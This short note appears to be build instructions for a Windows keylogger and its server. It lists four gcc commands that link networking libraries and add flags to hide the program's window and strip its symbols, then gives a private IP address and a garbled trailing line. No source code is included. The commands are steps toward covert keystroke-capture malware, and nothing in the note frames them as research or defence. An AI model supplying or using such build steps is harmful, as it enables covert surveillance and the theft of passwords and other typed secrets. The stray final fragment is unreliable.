Compile with:
1. **gcc keylogger.c -o keylogger.exe -lws2_32** 
2. **gcc server.c -o server.exe -lws2_32 -lgdi32 -mwindows**
3. **gcc -mwindows keylogger.c -o keylogger.exe -lws2_32 -ladvapi32**
4. **gcc -o keylogger.exe keylogger.c -lws2_32 -ladvapi32 -lkernel32 -luser32 -s -O2 -mwindows**

172.16.154.110 sict sex
